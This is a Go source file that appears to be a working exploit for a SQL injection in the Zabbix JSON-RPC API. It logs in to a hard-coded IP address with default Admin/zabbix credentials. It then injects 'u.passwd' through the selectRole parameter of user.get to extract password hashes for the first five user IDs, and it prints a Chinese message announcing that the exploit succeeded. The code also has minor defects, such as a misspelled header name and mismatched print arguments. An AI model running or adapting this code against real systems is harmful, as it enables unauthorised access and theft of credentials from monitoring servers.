package main

import (
	"fmt"
	"github.com/imroc/req/v3"
	"github.com/tidwall/gjson"
	"strconv"
	"strings"
)

type Logint struct {
	Jsonrpc string `json:"jsonrpc"`
	Method  string `json:"method"`
	Params  struct {
		Username string `json:"username"`
		Password string `json:"password"`
	} `json:"params"`
	Id int `json:"id"`
}

type Getin struct {
	Jsonrpc string `json:"jsonrpc"`
	Method  string `json:"method"`
	Params  struct {
		SelectRole []string `json:"selectRole"`
		Userids    string   `json:"userids"`
	} `json:"params"`
	Auth string `json:"auth"`
	Id   int    `json:"id"`
}

func Getlogin(host string, username string, passwd string) string {
	var url string
	if strings.HasSuffix(host, "/") {
		url = fmt.Sprintf("%sapi_jsonrpc.php", host)
	} else {
		url = fmt.Sprintf("%s/api_jsonrpc.php", host)
	}
	client := req.C()
	client.SetUserAgent("Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/616.24 (KHTML, like Gecko) Version/17.2 Safari/616.24").EnableForceHTTP1()
	//设置useragent
	logint := Logint{
		Jsonrpc: "2.0",
		Method:  "user.login",
		Params: struct {
			Username string `json:"username"`
			Password string `json:"password"`
		}{
			Username: username,
			Password: passwd,
		},
		Id: 1,
	}

	request := client.R() //创建一个请求实例
	post, err := request.SetHeaders(map[string]string{
		"Content-Type":   "application/json-rpc",
		"ccept-Encoding": "gzip, deflate, br", //设置headers
	}).SetBodyJsonMarshal(&logint).Post(url)
	if err != nil {
		fmt.Println(err)
		return "登陆失败"
	}

	return gjson.Get(post.String(), "result").String()
}

func Getinfo(host string, auth string, userid string) bool {

	client := req.C()
	var url string
	if strings.HasSuffix(host, "/") {
		url = fmt.Sprintf("%sapi_jsonrpc.php", host)
	} else {
		url = fmt.Sprintf("%s/api_jsonrpc.php", host)
	}
	client.SetUserAgent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.25").EnableForceHTTP1()
	getin := Getin{
		Jsonrpc: "2.0",
		Method:  "user.get",
		Params: struct {
			SelectRole []string `json:"selectRole"`
			Userids    string   `json:"userids"`
		}{
			SelectRole: []string{"roleid, u.passwd", "roleid"},
			Userids:    userid,
		},
		Auth: auth,
		Id:   2,
	}
	r := client.R()
	post, err := r.SetHeaders(map[string]string{
		"Content-Type":   "application/json-rpc",
		"ccept-Encoding": "gzip, deflate, br",
	}).SetBodyJsonMarshal(&getin).Post(url)
	if err != nil {
		fmt.Println(err)
		return false
	}
	result := gjson.Get(post.String(), "result")
	fmt.Println(result.String())
	if result.Exists() && result.IsArray() {
		for _, user := range result.Array() {
			username := user.Get("username").String()
			name := user.Get("name").String()
			surname := user.Get("surname").String()
			userID := user.Get("userid").String()
			rolePasswd := user.Get("rolepasswd").String()
			fmt.Printf("%s,%s,%s,%s,%s,%s,%s,%s,%s\n", username, name, surname, userID, rolePasswd, rolePasswd, surname)
		}
	} else {
		return false
	}
	return true
}

func main() {

	s := Getlogin("http://8.138.35.204/", "Admin", "zabbix")
	fmt.Println(s)
	for i := 1; i <= 5; i++ {
		getinfo := Getinfo("http://8.138.35.204/", s, strconv.Itoa(i))
		if getinfo {
			fmt.Println("漏洞利用成功")
		}
	}

}
